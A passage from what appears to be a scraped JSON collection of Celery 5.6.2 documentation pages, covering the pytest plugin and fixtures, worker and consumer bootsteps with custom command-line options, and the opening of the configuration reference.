@patch('proj.tasks.send_order.retry')\n    def test_failure(self, send_order_retry, product_order):\n        product = Product.objects.create(\n            name='Foo',\n        )\n\n        # Set a side effect on the patched methods\n        # so that they raise the errors we want.\n        send_order_retry.side_effect = Retry()\n        product_order.side_effect = OperationalError()\n\n        with raises(Retry):\n            send_order(product.pk, 3, Decimal(30.6))\n\npytest\n\nAdded in version 4.0.\n\nCelery also makes a https://pypi.org/project/pytest/ plugin available that adds fixtures that you can use in your integration (or unit) test suites.\n\nEnabling\n\nCelery initially ships the plugin in a disabled state. To enable it, you can either:\n\npip install celery[pytest]\n\nor add an environment variable PYTEST_PLUGINS=celery.contrib.pytest\n\nor add pytest_plugins = (\"celery.contrib.pytest\", ) to your root conftest.py\n\nMarks\ncelery - Set test app configuration.\n\nThe celery mark enables you to override the configuration used for a single test case:\n\n@pytest.mark.celery(result_backend='redis://')\ndef test_something():\n    ...\n\n\nor for all the test cases in a class:\n\n@pytest.mark.celery(result_backend='redis://')\nclass test_something:\n\n    def test_one(self):\n        ...\n\n    def test_two(self):\n        ...\n\nFixtures\nFunction scope\ncelery_app - Celery app used for testing.\n\nThis fixture returns a Celery app you can use for testing.\n\nExample:\n\ndef test_create_task(celery_app, celery_worker):\n    @celery_app.task\n    def mul(x, y):\n        return x * y\n\n    celery_worker.reload()\n    assert mul.delay(4, 4).get(timeout=10) == 16\n\ncelery_worker - Embed live worker.\n\nThis fixture starts a Celery worker instance that you can use for integration tests. The worker will be started in a separate thread and will be shutdown as soon as the test returns.\n\nBy default the fixture will wait up to 10 seconds for the worker to complete outstanding tasks and will raise an exception if the time limit is exceeded. The timeout can be customized by setting the shutdown_timeout key in the dictionary returned by the celery_worker_parameters() fixture.\n\nExample:\n\n# Put this in your conftest.py\n@pytest.fixture(scope='session')\ndef celery_config():\n    return {\n        'broker_url': 'amqp://',\n        'result_backend': 'redis://'\n    }\n\ndef test_add(celery_worker):\n    mytask.delay()\n\n\n# If you wish to override some setting in one test cases\n# only - you can use the ``celery`` mark:\n@pytest.mark.celery(result_backend='rpc')\ndef test_other(celery_worker):\n    ...\n\n\nHeartbeats are disabled by default which means that the test worker doesn’t send events for worker-online, worker-offline and worker-heartbeat. To enable heartbeats modify the celery_worker_parameters() fixture:\n\n# Put this in your conftest.py\n@pytest.fixture(scope=\"session\")\ndef celery_worker_parameters():\n    return {\"without_heartbeat\": False}\n    ...\n\nSession scope\ncelery_config - Override to setup Celery test app configuration.\n\nYou can redefine this fixture to configure the test Celery app.\n\nThe config returned by your fixture will then be used to configure the celery_app(), and celery_session_app() fixtures.\n\nExample:\n\n@pytest.fixture(scope='session')\ndef celery_config():\n    return {\n        'broker_url': 'amqp://',\n        'result_backend': 'rpc',\n    }\n\ncelery_parameters - Override to setup Celery test app parameters.\n\nYou can redefine this fixture to change the __init__ parameters of test Celery app. In contrast to celery_config(), these are directly passed to when instantiating Celery.\n\nThe config returned by your fixture will then be used to configure the celery_app(), and celery_session_app() fixtures.\n\nExample:\n\n@pytest.fixture(scope='session')\ndef celery_parameters():\n    return {\n        'task_cls':  my.package.MyCustomTaskClass,\n        'strict_typing': False,\n    }\n\ncelery_worker_parameters - Override to setup Celery worker parameters.\n\nYou can redefine this fixture to change the __init__ parameters of test Celery workers. These are directly passed to WorkController when it is instantiated.\n\nThe config returned by your fixture will then be used to configure the celery_worker(), and celery_session_worker() fixtures.\n\nExample:\n\n@pytest.fixture(scope='session')\ndef celery_worker_parameters():\n    return {\n        'queues':  ('high-prio', 'low-prio'),\n        'exclude_queues': ('celery'),\n    }\n\ncelery_enable_logging - Override to enable logging in embedded workers.\n\nThis is a fixture you can override to enable logging in embedded workers.\n\nExample:\n\n@pytest.fixture(scope='session')\ndef celery_enable_logging():\n    return True\n\ncelery_includes - Add additional imports for embedded workers.\n\nYou can override fixture to include modules when an embedded worker starts.\n\nYou can have this return a list of module names to import, which can be task modules, modules registering signals, and so on.\n\nExample:\n\n@pytest.fixture(scope='session')\ndef celery_includes():\n    return [\n        'proj.tests.tasks',\n        'proj.tests.celery_signal_handlers',\n    ]\n\ncelery_worker_pool - Override the pool used for embedded workers.\n\nYou can override fixture to configure the execution pool used for embedded workers.\n\nExample:\n\n@pytest.fixture(scope='session')\ndef celery_worker_pool():\n    return 'prefork'\n\n\nWarning\n\nYou cannot use the gevent/eventlet pools, that is unless your whole test suite is running with the monkeypatches enabled.\n\ncelery_session_worker - Embedded worker that lives throughout the session.\n\nThis fixture starts a worker that lives throughout the testing session (it won’t be started/stopped for every test).\n\nExample:\n\n# Add this to your conftest.py\n@pytest.fixture(scope='session')\ndef celery_config():\n    return {\n        'broker_url': 'amqp://',\n        'result_backend': 'rpc',\n    }\n\n# Do this in your tests.\ndef test_add_task(celery_session_worker):\n    assert add.delay(2, 2).get() == 4\n\n\nWarning\n\nIt’s probably a bad idea to mix session and ephemeral workers…\n\ncelery_session_app - Celery app used for testing (session scope).\n\nThis can be used by other session scoped fixtures when they need to refer to a Celery app instance.\n\nuse_celery_app_trap - Raise exception on falling back to default app.\n\nThis is a fixture you can override in your conftest.py, to enable the “app trap”: if something tries to access the default or current_app, an exception is raised.\n\nExample:\n\n@pytest.fixture(scope='session')\ndef use_celery_app_trap():\n    return True\n\n\nIf a test wants to access the default app, you would have to mark it using the depends_on_current_app fixture:\n\n@pytest.mark.usefixtures('depends_on_current_app')\ndef test_something():\n    something()\n\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nSignals\n\nNext topic\n\nExtensions and Bootsteps\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Testing with Celery\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491582,
    "timestamp": "2026-02-23T00:13:49.364Z",
    "title": "Extensions and Bootsteps — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/extending.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Extensions and Bootsteps\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nExtensions and Bootsteps\n\nCustom Message Consumers\n\nBlueprints\n\nWorker\n\nAttributes\n\nExample worker bootstep\n\nCustomizing Task Handling Logs\n\nConsumer\n\nAttributes\n\nMethods\n\nInstalling Bootsteps\n\nCommand-line programs\n\nAdding new command-line options\n\nAdding new celery sub-commands\n\nWorker API\n\nHub - The workers async event loop\n\nTimer - Scheduling events\n\nCustom Message Consumers\n\nYou may want to embed custom Kombu consumers to manually process your messages.\n\nFor that purpose a special ConsumerStep bootstep class exists, where you only need to define the get_consumers method, that must return a list of kombu.Consumer objects to start whenever the connection is established:\n\nfrom celery import Celery\nfrom celery import bootsteps\nfrom kombu import Consumer, Exchange, Queue\n\nmy_queue = Queue('custom', Exchange('custom'), 'routing_key')\n\napp = Celery(broker='amqp://')\n\n\nclass MyConsumerStep(bootsteps.ConsumerStep):\n\n    def get_consumers(self, channel):\n        return [Consumer(channel,\n                         queues=[my_queue],\n                         callbacks=[self.handle_message],\n                         accept=['json'])]\n\n    def handle_message(self, body, message):\n        print('Received message: {0!r}'.format(body))\n        message.ack()\napp.steps['consumer'].add(MyConsumerStep)\n\ndef send_me_a_message(who, producer=None):\n    with app.producer_or_acquire(producer) as producer:\n        producer.publish(\n            {'hello': who},\n            serializer='json',\n            exchange=my_queue.exchange,\n            routing_key='routing_key',\n            declare=[my_queue],\n            retry=True,\n        )\n\nif __name__ == '__main__':\n    send_me_a_message('world!')\n\n\nNote\n\nKombu Consumers can take use of two different message callback dispatching mechanisms. The first one is the callbacks argument that accepts a list of callbacks with a (body, message) signature, the second one is the on_message argument that takes a single callback with a (message,) signature. The latter won’t automatically decode and deserialize the payload.\n\ndef get_consumers(self, channel):\n    return [Consumer(channel, queues=[my_queue],\n                     on_message=self.on_message)]\n\n\ndef on_message(self, message):\n    payload = message.decode()\n    print(\n        'Received message: {0!r} {props!r} rawlen={s}'.format(\n        payload, props=message.properties, s=len(message.body),\n    ))\n    message.ack()\n\nBlueprints\n\nBootsteps is a technique to add functionality to the workers. A bootstep is a custom class that defines hooks to do custom actions at different stages in the worker. Every bootstep belongs to a blueprint, and the worker currently defines two blueprints: Worker, and Consumer\n\nFigure A: Bootsteps in the Worker and Consumer blueprints. Starting\n\nfrom the bottom up the first step in the worker blueprint is the Timer, and the last step is to start the Consumer blueprint, that then establishes the broker connection and starts consuming messages.\n\nWorker\n\nThe Worker is the first blueprint to start, and with it starts major components like the event loop, processing pool, and the timer used for ETA tasks and other timed events.\n\nWhen the worker is fully started it continues with the Consumer blueprint, that sets up how tasks are executed, connects to the broker and starts the message consumers.\n\nThe WorkController is the core worker implementation, and contains several methods and attributes that you can use in your bootstep.\n\nAttributes\napp\n\nThe current app instance.\n\nhostname\n\nThe workers node name (e.g., worker1@example.com)\n\nblueprint\n\nThis is the worker Blueprint.\n\nhub\n\nEvent loop object (Hub). You can use this to register callbacks in the event loop.\n\nThis is only supported by async I/O enabled transports (amqp, redis), in which case the worker.use_eventloop attribute should be set.\n\nYour worker bootstep must require the Hub bootstep to use this:\n\nclass WorkerStep(bootsteps.StartStopStep):\n    requires = {'celery.worker.components:Hub'}\n\npool\n\nThe current process/eventlet/gevent/thread pool. See celery.concurrency.base.BasePool.\n\nYour worker bootstep must require the Pool bootstep to use this:\n\nclass WorkerStep(bootsteps.StartStopStep):\n    requires = {'celery.worker.components:Pool'}\n\ntimer\n\nTimer used to schedule functions.\n\nYour worker bootstep must require the Timer bootstep to use this:\n\nclass WorkerStep(bootsteps.StartStopStep):\n    requires = {'celery.worker.components:Timer'}\n\nstatedb\n\nDatabase <celery.worker.state.Persistent>` to persist state between worker restarts.\n\nThis is only defined if the statedb argument is enabled.\n\nYour worker bootstep must require the Statedb bootstep to use this:\n\nclass WorkerStep(bootsteps.StartStopStep):\n    requires = {'celery.worker.components:Statedb'}\n\nautoscaler\n\nAutoscaler used to automatically grow and shrink the number of processes in the pool.\n\nThis is only defined if the autoscale argument is enabled.\n\nYour worker bootstep must require the Autoscaler bootstep to use this:\n\nclass WorkerStep(bootsteps.StartStopStep):\n    requires = ('celery.worker.autoscaler:Autoscaler',)\n\nautoreloader\n\nAutoreloader used to automatically reload use code when the file-system changes.\n\nThis is only defined if the autoreload argument is enabled. Your worker bootstep must require the Autoreloader bootstep to use this;\n\nclass WorkerStep(bootsteps.StartStopStep):\n    requires = ('celery.worker.autoreloader:Autoreloader',)\n\nExample worker bootstep\n\nAn example Worker bootstep could be:\n\nfrom celery import bootsteps\n\nclass ExampleWorkerStep(bootsteps.StartStopStep):\n    requires = {'celery.worker.components:Pool'}\n\n    def __init__(self, worker, **kwargs):\n        print('Called when the WorkController instance is constructed')\n        print('Arguments to WorkController: {0!r}'.format(kwargs))\n\n    def create(self, worker):\n        # this method can be used to delegate the action methods\n        # to another object that implements ``start`` and ``stop``.\n        return self\n\n    def start(self, worker):\n        print('Called when the worker is started.')\n\n    def stop(self, worker):\n        print('Called when the worker shuts down.')\n\n    def terminate(self, worker):\n        print('Called when the worker terminates')\n\n\nEvery method is passed the current WorkController instance as the first argument.\n\nAnother example could use the timer to wake up at regular intervals:\n\nfrom celery import bootsteps\n\n\nclass DeadlockDetection(bootsteps.StartStopStep):\n    requires = {'celery.worker.components:Timer'}\n\n    def __init__(self, worker, deadlock_timeout=3600):\n        self.timeout = deadlock_timeout\n        self.requests = []\n        self.tref = None\n\n    def start(self, worker):\n        # run every 30 seconds.\n        self.tref = worker.timer.call_repeatedly(\n            30.0, self.detect, (worker,), priority=10,\n        )\n\n    def stop(self, worker):\n        if self.tref:\n            self.tref.cancel()\n            self.tref = None\n\n    def detect(self, worker):\n        # update active requests\n        for req in worker.active_requests:\n            if req.time_start and time() - req.time_start > self.timeout:\n                raise SystemExit()\n\nCustomizing Task Handling Logs\n\nThe Celery worker emits messages to the Python logging subsystem for various events throughout the lifecycle of a task. These messages can be customized by overriding the LOG_<TYPE> format strings which are defined in celery/app/trace.py. For example:\n\nimport celery.app.trace\n\ncelery.app.trace.LOG_SUCCESS = \"This is a custom message\"\n\n\nThe various format strings are all provided with the task name and ID for % formatting, and some of them receive extra fields like the return value or the exception which caused a task to fail. These fields can be used in custom format strings like so:\n\nimport celery.app.trace\n\ncelery.app.trace.LOG_REJECTED = \"%(name)r is cursed and I won't run it: %(exc)s\"\n\nConsumer\n\nThe Consumer blueprint establishes a connection to the broker, and is restarted every time this connection is lost. Consumer bootsteps include the worker heartbeat, the remote control command consumer, and importantly, the task consumer.\n\nWhen you create consumer bootsteps you must take into account that it must be possible to restart your blueprint. An additional ‘shutdown’ method is defined for consumer bootsteps, this method is called when the worker is shutdown.\n\nAttributes\napp\n\nThe current app instance.\n\ncontroller\n\nThe parent WorkController object that created this consumer.\n\nhostname\n\nThe workers node name (e.g., worker1@example.com)\n\nblueprint\n\nThis is the worker Blueprint.\n\nhub\n\nEvent loop object (Hub). You can use this to register callbacks in the event loop.\n\nThis is only supported by async I/O enabled transports (amqp, redis), in which case the worker.use_eventloop attribute should be set.\n\nYour worker bootstep must require the Hub bootstep to use this:\n\nclass WorkerStep(bootsteps.StartStopStep):\n    requires = {'celery.worker.components:Hub'}\n\nconnection\n\nThe current broker connection (kombu.Connection).\n\nA consumer bootstep must require the ‘Connection’ bootstep to use this:\n\nclass Step(bootsteps.StartStopStep):\n    requires = {'celery.worker.consumer.connection:Connection'}\n\nevent_dispatcher\n\nA app.events.Dispatcher object that can be used to send events.\n\nA consumer bootstep must require the Events bootstep to use this.\n\nclass Step(bootsteps.StartStopStep):\n    requires = {'celery.worker.consumer.events:Events'}\n\ngossip\n\nWorker to worker broadcast communication (Gossip).\n\nA consumer bootstep must require the Gossip bootstep to use this.\n\nclass RatelimitStep(bootsteps.StartStopStep):\n    \"\"\"Rate limit tasks based on the number of workers in the\n    cluster.\"\"\"\n    requires = {'celery.worker.consumer.gossip:Gossip'}\n\n    def start(self, c):\n        self.c = c\n        self.c.gossip.on.node_join.add(self.on_cluster_size_change)\n        self.c.gossip.on.node_leave.add(self.on_cluster_size_change)\n        self.c.gossip.on.node_lost.add(self.on_node_lost)\n        self.tasks = [\n            self.app.tasks['proj.tasks.add']\n            self.app.tasks['proj.tasks.mul']\n        ]\n        self.last_size = None\n\n    def on_cluster_size_change(self, worker):\n        cluster_size = len(list(self.c.gossip.state.alive_workers()))\n        if cluster_size != self.last_size:\n            for task in self.tasks:\n                task.rate_limit = 1.0 / cluster_size\n            self.c.reset_rate_limits()\n            self.last_size = cluster_size\n\n    def on_node_lost(self, worker):\n        # may have processed heartbeat too late, so wake up soon\n        # in order to see if the worker recovered.\n        self.c.timer.call_after(10.0, self.on_cluster_size_change)\n\n\nCallbacks\n\n<set> gossip.on.node_join\n\nCalled whenever a new node joins the cluster, providing a Worker instance.\n\n<set> gossip.on.node_leave\n\nCalled whenever a new node leaves the cluster (shuts down), providing a Worker instance.\n\n<set> gossip.on.node_lost\n\nCalled whenever heartbeat was missed for a worker instance in the cluster (heartbeat not received or processed in time), providing a Worker instance.\n\nThis doesn’t necessarily mean the worker is actually offline, so use a time out mechanism if the default heartbeat timeout isn’t sufficient.\n\npool\n\nThe current process/eventlet/gevent/thread pool. See celery.concurrency.base.BasePool.\n\ntimer\n\nTimer <celery.utils.timer2.Schedule used to schedule functions.\n\nheart\n\nResponsible for sending worker event heartbeats (Heart).\n\nYour consumer bootstep must require the Heart bootstep to use this:\n\nclass Step(bootsteps.StartStopStep):\n    requires = {'celery.worker.consumer.heart:Heart'}\n\ntask_consumer\n\nThe kombu.Consumer object used to consume task messages.\n\nYour consumer bootstep must require the Tasks bootstep to use this:\n\nclass Step(bootsteps.StartStopStep):\n    requires = {'celery.worker.consumer.tasks:Tasks'}\n\nstrategies\n\nEvery registered task type has an entry in this mapping, where the value is used to execute an incoming message of this task type (the task execution strategy). This mapping is generated by the Tasks bootstep when the consumer starts:\n\nfor name, task in app.tasks.items():\n    strategies[name] = task.start_strategy(app, consumer)\n    task.__trace__ = celery.app.trace.build_tracer(\n        name, task, loader, hostname\n    )\n\n\nYour consumer bootstep must require the Tasks bootstep to use this:\n\nclass Step(bootsteps.StartStopStep):\n    requires = {'celery.worker.consumer.tasks:Tasks'}\n\ntask_buckets\n\nA defaultdict used to look-up the rate limit for a task by type. Entries in this dict may be None (for no limit) or a TokenBucket instance implementing consume(tokens) and expected_time(tokens).\n\nTokenBucket implements the token bucket algorithm, but any algorithm may be used as long as it conforms to the same interface and defines the two methods above.\n\nqos\n\nThe QoS object can be used to change the task channels current prefetch_count value:\n\n# increment at next cycle\nconsumer.qos.increment_eventually(1)\n# decrement at next cycle\nconsumer.qos.decrement_eventually(1)\nconsumer.qos.set(10)\n\nMethods\nconsumer.reset_rate_limits()\n\nUpdates the task_buckets mapping for all registered task types.\n\nconsumer.bucket_for_task(type, Bucket=TokenBucket)\n\nCreates rate limit bucket for a task using its task.rate_limit attribute.\n\nconsumer.add_task_queue(name, exchange=None, exchange_type=None,\nrouting_key=None, \\*\\*options):\n\nAdds new queue to consume from. This will persist on connection restart.\n\nconsumer.cancel_task_queue(name)\n\nStop consuming from queue by name. This will persist on connection restart.\n\napply_eta_task(request)\n\nSchedule ETA task to execute based on the request.eta attribute. (Request)\n\nInstalling Bootsteps\n\napp.steps['worker'] and app.steps['consumer'] can be modified to add new bootsteps:\n\n>>> app = Celery()\n>>> app.steps['worker'].add(MyWorkerStep)  # < add class, don't instantiate\n>>> app.steps['consumer'].add(MyConsumerStep)\n\n>>> app.steps['consumer'].update([StepA, StepB])\n\n>>> app.steps['consumer']\n{step:proj.StepB{()}, step:proj.MyConsumerStep{()}, step:proj.StepA{()}\n\n\nThe order of steps isn’t important here as the order is decided by the resulting dependency graph (Step.requires).\n\nTo illustrate how you can install bootsteps and how they work, this is an example step that prints some useless debugging information. It can be added both as a worker and consumer bootstep:\n\nfrom celery import Celery\nfrom celery import bootsteps\n\nclass InfoStep(bootsteps.Step):\n\n    def __init__(self, parent, **kwargs):\n        # here we can prepare the Worker/Consumer object\n        # in any way we want, set attribute defaults, and so on.\n        print('{0!r} is in init'.format(parent))\n\n    def start(self, parent):\n        # our step is started together with all other Worker/Consumer\n        # bootsteps.\n        print('{0!r} is starting'.format(parent))\n\n    def stop(self, parent):\n        # the Consumer calls stop every time the consumer is\n        # restarted (i.e., connection is lost) and also at shutdown.\n        # The Worker will call stop at shutdown only.\n        print('{0!r} is stopping'.format(parent))\n\n    def shutdown(self, parent):\n        # shutdown is called by the Consumer at shutdown, it's not\n        # called by Worker.\n        print('{0!r} is shutting down'.format(parent))\n\n    app = Celery(broker='amqp://')\n    app.steps['worker'].add(InfoStep)\n    app.steps['consumer'].add(InfoStep)\n\n\nStarting the worker with this step installed will give us the following logs:\n\n<Worker: w@example.com (initializing)> is in init\n<Consumer: w@example.com (initializing)> is in init\n[2013-05-29 16:18:20,544: WARNING/MainProcess]\n    <Worker: w@example.com (running)> is starting\n[2013-05-29 16:18:21,577: WARNING/MainProcess]\n    <Consumer: w@example.com (running)> is starting\n<Consumer: w@example.com (closing)> is stopping\n<Worker: w@example.com (closing)> is stopping\n<Consumer: w@example.com (terminating)> is shutting down\n\n\nThe print statements will be redirected to the logging subsystem after the worker has been initialized, so the “is starting” lines are time-stamped. You may notice that this does no longer happen at shutdown, this is because the stop and shutdown methods are called inside a signal handler, and it’s not safe to use logging inside such a handler. Logging with the Python logging module isn’t reentrant: meaning you cannot interrupt the function then call it again later. It’s important that the stop and shutdown methods you write is also reentrant.\n\nStarting the worker with --loglevel=debug will show us more information about the boot process:\n\n[2013-05-29 16:18:20,509: DEBUG/MainProcess] | Worker: Preparing bootsteps.\n[2013-05-29 16:18:20,511: DEBUG/MainProcess] | Worker: Building graph...\n<celery.apps.worker.Worker object at 0x101ad8410> is in init\n[2013-05-29 16:18:20,511: DEBUG/MainProcess] | Worker: New boot order:\n    {Hub, Pool, Timer, StateDB, Autoscaler, InfoStep, Beat, Consumer}\n[2013-05-29 16:18:20,514: DEBUG/MainProcess] | Consumer: Preparing bootsteps.\n[2013-05-29 16:18:20,514: DEBUG/MainProcess] | Consumer: Building graph...\n<celery.worker.consumer.Consumer object at 0x101c2d8d0> is in init\n[2013-05-29 16:18:20,515: DEBUG/MainProcess] | Consumer: New boot order:\n    {Connection, Mingle, Events, Gossip, InfoStep, Agent,\n     Heart, Control, Tasks, event loop}\n[2013-05-29 16:18:20,522: DEBUG/MainProcess] | Worker: Starting Hub\n[2013-05-29 16:18:20,522: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:20,522: DEBUG/MainProcess] | Worker: Starting Pool\n[2013-05-29 16:18:20,542: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:20,543: DEBUG/MainProcess] | Worker: Starting InfoStep\n[2013-05-29 16:18:20,544: WARNING/MainProcess]\n    <celery.apps.worker.Worker object at 0x101ad8410> is starting\n[2013-05-29 16:18:20,544: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:20,544: DEBUG/MainProcess] | Worker: Starting Consumer\n[2013-05-29 16:18:20,544: DEBUG/MainProcess] | Consumer: Starting Connection\n[2013-05-29 16:18:20,559: INFO/MainProcess] Connected to amqp://guest@127.0.0.1:5672//\n[2013-05-29 16:18:20,560: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:20,560: DEBUG/MainProcess] | Consumer: Starting Mingle\n[2013-05-29 16:18:20,560: INFO/MainProcess] mingle: searching for neighbors\n[2013-05-29 16:18:21,570: INFO/MainProcess] mingle: no one here\n[2013-05-29 16:18:21,570: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:21,571: DEBUG/MainProcess] | Consumer: Starting Events\n[2013-05-29 16:18:21,572: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:21,572: DEBUG/MainProcess] | Consumer: Starting Gossip\n[2013-05-29 16:18:21,577: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:21,577: DEBUG/MainProcess] | Consumer: Starting InfoStep\n[2013-05-29 16:18:21,577: WARNING/MainProcess]\n    <celery.worker.consumer.Consumer object at 0x101c2d8d0> is starting\n[2013-05-29 16:18:21,578: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:21,578: DEBUG/MainProcess] | Consumer: Starting Heart\n[2013-05-29 16:18:21,579: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:21,579: DEBUG/MainProcess] | Consumer: Starting Control\n[2013-05-29 16:18:21,583: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:21,583: DEBUG/MainProcess] | Consumer: Starting Tasks\n[2013-05-29 16:18:21,606: DEBUG/MainProcess] basic.qos: prefetch_count->80\n[2013-05-29 16:18:21,606: DEBUG/MainProcess] ^-- substep ok\n[2013-05-29 16:18:21,606: DEBUG/MainProcess] | Consumer: Starting event loop\n[2013-05-29 16:18:21,608: WARNING/MainProcess] celery@example.com ready.\n\nCommand-line programs\nAdding new command-line options\nCommand-specific options\n\nYou can add additional command-line options to the worker, beat, and events commands by modifying the user_options attribute of the application instance.\n\nCelery commands uses the click module to parse command-line arguments, and so to add custom arguments you need to add click.Option instances to the relevant set.\n\nExample adding a custom option to the celery worker command:\n\nfrom celery import Celery\nfrom click import Option\n\napp = Celery(broker='amqp://')\n\napp.user_options['worker'].add(Option(('--enable-my-option',),\n                                      is_flag=True,\n                                      help='Enable custom option.'))\n\n\nAll bootsteps will now receive this argument as a keyword argument to Bootstep.__init__:\n\nfrom celery import bootsteps\n\nclass MyBootstep(bootsteps.Step):\n\n    def __init__(self, parent, enable_my_option=False, **options):\n        super().__init__(parent, **options)\n        if enable_my_option:\n            party()\n\napp.steps['worker'].add(MyBootstep)\n\nPreload options\n\nThe celery umbrella command supports the concept of ‘preload options’. These are special options passed to all sub-commands.\n\nYou can add new preload options, for example to specify a configuration template:\n\nfrom celery import Celery\nfrom celery import signals\nfrom click import Option\n\napp = Celery()\n\napp.user_options['preload'].add(Option(('-Z', '--template'),\n                                       default='default',\n                                       help='Configuration template to use.'))\n\n@signals.user_preload_options.connect\ndef on_preload_parsed(options, **kwargs):\n    use_template(options['template'])\n\nAdding new celery sub-commands\n\nNew commands can be added to the celery umbrella command by using setuptools entry-points.\n\nEntry-points is special meta-data that can be added to your packages setup.py program, and then after installation, read from the system using the importlib module.\n\nCelery recognizes celery.commands entry-points to install additional sub-commands, where the value of the entry-point must point to a valid click command.\n\nThis is how the https://pypi.org/project/Flower/ monitoring extension may add the celery flower command, by adding an entry-point in setup.py:\n\nsetup(\n    name='flower',\n    entry_points={\n        'celery.commands': [\n           'flower = flower.command:flower',\n        ],\n    }\n)\n\n\nThe command definition is in two parts separated by the equal sign, where the first part is the name of the sub-command (flower), then the second part is the fully qualified symbol path to the function that implements the command:\n\nflower.command:flower\n\n\nThe module path and the name of the attribute should be separated by colon as above.\n\nIn the module flower/command.py, the command function may be defined as the following:\n\nimport click\n\n@click.command()\n@click.option('--port', default=8888, type=int, help='Webserver port')\n@click.option('--debug', is_flag=True)\ndef flower(port, debug):\n    print('Running our command')\n\nWorker API\nHub - The workers async event loop\nsupported transports:\n\namqp, redis\n\nAdded in version 3.0.\n\nThe worker uses asynchronous I/O when the amqp or redis broker transports are used. The eventual goal is for all transports to use the event-loop, but that will take some time so other transports still use a threading-based solution.\n\nhub.add(fd, callback, flags)\nhub.add_reader(fd, callback, \\*args)\n\nAdd callback to be called when fd is readable.\n\nThe callback will stay registered until explicitly removed using hub.remove(fd), or the file descriptor is automatically discarded because it’s no longer valid.\n\nNote that only one callback can be registered for any given file descriptor at a time, so calling add a second time will remove any callback that was previously registered for that file descriptor.\n\nA file descriptor is any file-like object that supports the fileno method, or it can be the file descriptor number (int).\n\nhub.add_writer(fd, callback, \\*args)\n\nAdd callback to be called when fd is writable. See also notes for hub.add_reader() above.\n\nhub.remove(fd)\n\nRemove all callbacks for file descriptor fd from the loop.\n\nTimer - Scheduling events\ntimer.call_after(secs, callback, args=(), kwargs=(),\npriority=0)\ntimer.call_repeatedly(secs, callback, args=(), kwargs=(),\npriority=0)\ntimer.call_at(eta, callback, args=(), kwargs=(),\npriority=0)\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nTesting with Celery\n\nNext topic\n\nConfiguration and defaults\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Extensions and Bootsteps\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491583,
    "timestamp": "2026-02-23T00:13:49.377Z",
    "title": "Configuration and defaults — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/configuration.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Configuration and defaults\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nConfiguration and defaults\n\nThis document describes the configuration options available.\n\nIf you’re using the default loader, you must create the celeryconfig.py module and make sure it’s available on the Python path.\n\nExample configuration file\n\nNew lowercase settings\n\nConfiguration Directives\n\nGeneral settings\n\nTime and date settings\n\nTask settings\n\nTask execution settings\n\nTask result backend settings\n\nDatabase backend settings\n\nRPC backend settings\n\nCache backend settings\n\nMongoDB backend settings\n\nRedis backend settings\n\nCassandra/AstraDB backend settings\n\nS3 backend settings\n\nAzure Block Blob backend settings\n\nGCS backend settings\n\nElasticsearch backend settings\n\nAWS DynamoDB backend settings\n\nIronCache backend settings\n\nCouchbase backend settings\n\nArangoDB backend settings\n\nCosmosDB backend settings (experimental)\n\nCouchDB backend settings\n\nFile-system backend settings\n\nConsul K/V store backend settings\n\nMessage Routing\n\nBroker Settings\n\nWorker\n\nEvents\n\nRemote Control Commands\n\ncontrol_queue_durable\n\ncontrol_queue_exclusive\n\nLogging\n\nSecurity\n\nCustom Component Classes (advanced)\n\nBeat Settings (celery beat)\n\nExample configuration file\n\nThis is an example configuration file to get you started. It should contain all you need to run a basic Celery set-up.\n\n## Broker settings.\nbroker_url = 'amqp://guest:guest@localhost:5672//'\n\n# List of modules to import when the Celery worker starts.\nimports = ('myapp.tasks',)\n\n## Using the database to store task state and results.\nresult_backend = 'db+sqlite:///results.db'\n\ntask_annotations = {'tasks.add': {'rate_limit': '10/s'}}\n\nNew lowercase settings\n\nVersion 4.0 introduced new lower case settings and setting organization.\n\nThe major difference between previous versions, apart from the lower case names, are the renaming of some prefixes, like celery_beat_ to beat_, celeryd_ to worker_, and most of the top level celery_ settings have been moved into a new task_ prefix.\n\nWarning\n\nCelery will still be able to read old configuration files until Celery 6.0. Afterwards, support for the old configuration files will be removed. We provide the celery upgrade command that should handle plenty of cases (including Django).\n\nPlease migrate to the new configuration scheme as soon as possible.\n\nConfiguration Directives\nGeneral settings\naccept_content\n\nDefault: {'json'} (set, list, or tuple).\n\nA white-list of content-types/serializers to allow.\n\nIf a message is received that’s not in this list then the message will be discarded with an error.\n\nBy default only json is enabled but any content type can be added, including pickle and yaml; when this is the case make sure untrusted parties don’t have access to your broker. See Security for more.\n\nExample:\n\n# using serializer name\naccept_content = ['json']\n\n# or the actual content-type (MIME)\naccept_content = ['application/json']\n\nresult_accept_content\n\nDefault: None (can be set, list or tuple).\n\nAdded in version 4.3.\n\nA white-list of content-types/serializers to allow for the result backend.\n\nIf a message is received that’s not in this list then the message will be discarded with an error.\n\nBy default it is the same serializer as accept_content. However, a different serializer for accepted content of the result backend can be specified. Usually this is needed if signed messaging is used and the result is stored unsigned in the result backend. See Security for more.\n\nExample:\n\n# using serializer name\nresult_accept_content = ['json']\n\n# or the actual content-type (MIME)\nresult_accept_content = ['application/json']\n\nTime and date 